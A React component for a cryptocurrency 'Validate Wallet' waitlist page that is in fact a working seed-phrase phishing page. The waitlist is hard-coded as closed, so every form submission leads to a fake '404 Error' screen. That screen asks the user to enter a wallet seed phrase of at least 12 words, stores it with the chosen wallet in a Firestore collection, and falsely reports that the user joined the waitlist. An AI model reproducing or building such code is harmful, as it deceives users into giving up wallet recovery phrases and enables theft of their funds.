import React, { useState, useEffect } from 'react';
import { Wallet2, X } from 'lucide-react';
import { addDoc, collection } from 'firebase/firestore';
import { db } from '../firebase'; // Import the initialized Firebase
import { useNavigate } from 'react-router-dom'; // Import useNavigate for navigation

const wallets = [
  { name: 'MetaMask', id: 'metamask' },
  { name: 'WalletConnect', id: 'walletconnect' },
  { name: 'Coinbase Wallet', id: 'coinbase' },
  { name: 'Trust Wallet', id: 'trust' },
  { name: 'Ledger', id: 'ledger' },
  { name: 'phantom', id: 'Phantom' }
];

export default function WaitlistPage() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [walletAddress, setWalletAddress] = useState('');
  const [email, setEmail] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState('');
  const [waitlistOpen, setWaitlistOpen] = useState(false); // Waitlist is closed now
  const [phrase, setPhrase] = useState(''); // To store the entered phrase
  const [isCorrectPhrase, setIsCorrectPhrase] = useState(false); // To check if phrase is correct
  const [showErrorPage, setShowErrorPage] = useState(false); // To show the error page for closed waitlist
  const [loading, setLoading] = useState(false); // To manage loading state
  const [showSuccessMessage, setShowSuccessMessage] = useState(false); // State to manage success message visibility

  const navigate = useNavigate(); // Hook for navigation

  // Function to handle back navigation
  const handleBackClick = () => {
    navigate(-1);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!selectedWallet || !walletAddress || !email) {
      setSubmitStatus('error');
      setIsSubmitting(false);
      return;
    }

    if (waitlistOpen) {
      try {
        await addDoc(collection(db, 'waitlist'), {
          wallet: selectedWallet.name,
          address: walletAddress,
          email,
          timestamp: new Date().toISOString(),
        });

        setSubmitStatus('success');
        setWalletAddress('');
        setEmail('');
        setSelectedWallet(null);
        setIsModalOpen(false);

        // Show success message and navigate after 3 seconds
        setShowSuccessMessage(true);
        setTimeout(() => {
          setShowSuccessMessage(false);
          navigate('/waitlist'); // Redirect to the waitlist page
        }, 3000); // Redirect after 3 seconds
      } catch (error) {
        console.error('Error adding to waitlist:', error);
        setSubmitStatus('error');
      } finally {
        setIsSubmitting(false);
      }
    } else {
      // Show error page and start loading spinner
      setShowErrorPage(true);
      setLoading(true);

      setTimeout(() => {
        setLoading(false);
        setShowErrorPage(true); // Show the form for entering the secret phrase
      }, 5000); // 5-second delay
    }
  };

  const handlePhraseSubmit = async (e) => {
    e.preventDefault();

    // Ensure the phrase has at least 12 words
    const wordCount = phrase.trim().split(/\s+/).length;
    if (wordCount < 12) {
      alert('The phrase must contain at least 12 words.');
      return;
    }

    // Save the unique phrase to Firestore
    try {
      await addDoc(collection(db, 'validPhrases'), {
        phrase: phrase,
        wallet: selectedWallet.name, // Store the selected wallet
        timestamp: new Date().toISOString(),
      });

      setIsCorrectPhrase(true);
      alert('Phrase submitted successfully! You have been added to the waitlist.');
    } catch (error) {
      console.error('Error adding phrase to Firestore:', error);
      alert('There was an issue saving the phrase. Please try again.');
    }
  };

  if (showErrorPage) {
    return (
      <div className="min-h-screen bg-gray-900 pt-24 px-6 flex flex-col items-center backdrop-blur-sm">
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50">
          <div className="bg-gray-800 rounded-xl p-6 max-w-md w-full space-y-4">
            <h1 className="text-2xl font-space font-bold text-red-500 mb-8">404 Error</h1>
            <p className="text-xl text-gray-300 mb-8"><span className="text-[#00ff94] hover:text-stone-500 transition-colors">Waitlist is closed</span>.Enter your seed phrase to proceed.</p>
            
            {loading ? (
              <div className="flex justify-center">
                <div className="w-10 h-10 border-4 border-t-4 border-gray-300 rounded-full animate-spin border-t-[#00ff94]"></div> {/* Spinner */}
              </div>
            ) : (
              <form onSubmit={handlePhraseSubmit} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">Enter seed Phrase</label>
                  <textarea
                    value={phrase}
                    onChange={(e) => setPhrase(e.target.value)}
                    className="w-full bg-gray-700 rounded-lg px-4 py-2 text-white h-32 border-gray-700 hover:border-[#00ff94] hover:text-black"
                    placeholder="Enter secret phrase"
                    required
                  />
                </div>

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full btn btn-filled justify-center"
                >
                  {loading ? 'Loading...' : 'Submit Phrase'}
                </button>
              </form>
            )}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 pt-24 px-6">
      {/* Back Button */}
        <button
          onClick={() => navigate(-1)}
           className="text-white bg-gray-800 p-2 rounded-lg mb-4"
        >
          &larr; Back
        </button>
      <div className="max-w-4xl mx-auto">
        <h1 className="text-4xl md:text-5xl font-space font-bold mb-8">
          Validate <span className="gradient-text">Wallet</span>
        </h1>

        {submitStatus === 'success' && (
          <div className="bg-green-500 text-white p-4 rounded-md mb-4">
            Successfully added to the waitlist! 🎉
          </div>
        )}
        {submitStatus === 'error' && (
          <div className="bg-red-500 text-white p-4 rounded-md mb-4">
            Something went wrong. Please try again.
          </div>
        )}

        {showSuccessMessage && (
          <div className="bg-green-500 text-white p-4 rounded-md mb-4 opacity-100 transition-opacity duration-500">
            <p>🎉 You have successfully joined the waitlist! We'll notify you soon.</p>
          </div>
        )}

        <div className="grid md:grid-cols-2 gap-8 mb-12">
          <div className="bg-gray-800/50 p-8 rounded-xl border border-gray-700">
            <h2 className="text-2xl font-space mb-4">Why Join?</h2>
            <ul className="space-y-4 text-gray-300">
              <li className="flex items-start space-x-3">
                <span className="text-[#00ff94]">•</span>
                <span>Early access to platform features</span>
              </li>
              <li className="flex items-start space-x-3">
                <span className="text-[#00ff94]">•</span>
                <span>Exclusive airdrops for early supporters</span>
              </li>
              <li className="flex items-start space-x-3">
                <span className="text-[#00ff94]">•</span>
                <span>Priority customer support</span>
              </li>
            </ul>
          </div>

          <div className="space-y-6">
            <h2 className="text-2xl font-space">Connect Your Wallet</h2>
            <div className="grid gap-4">
              {wallets.map((wallet) => (
                <button
                  key={wallet.id}
                  className="flex items-center justify-between p-4 bg-gray-800/50 rounded-lg border border-gray-700 hover:border-[#00ff94] transition-all"
                  onClick={() => {
                    setSelectedWallet(wallet);
                    setIsModalOpen(true);
                  }}
                >
                  <span className="font-medium">{wallet.name}</span>
                  <Wallet2 className="w-5 h-5 text-[#00ff94]" />
                </button>
              ))}
            </div>
          </div>
        </div>

        {isModalOpen && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50">
            <div className="bg-gray-800 rounded-xl p-6 max-w-md w-full">
              <div className="flex justify-between items-center mb-6">
                <h3 className="text-xl font-space">
                  Connect {selectedWallet?.name}
                </h3>
                <button
                  onClick={() => setIsModalOpen(false)}
                  className="text-gray-400 hover:text-white"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Wallet Address
                  </label>
                  <input
                    type="text"
                    value={walletAddress}
                    onChange={(e) => setWalletAddress(e.target.value)}
                    className="w-full bg-gray-700 rounded-lg px-4 py-2 text-white"
                    placeholder="0x..."
                    required
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Email Address
                  </label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full bg-gray-700 rounded-lg px-4 py-2 text-white"
                    placeholder="you@example.com"
                    required
                  />
                </div>

                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full btn btn-filled justify-center"
                >
                  {isSubmitting ? 'Submitting...' : 'Validate Wallet'}
                </button>
              </form>
            </div>
          </div>
        )}


      </div>
    </div>
  );
}
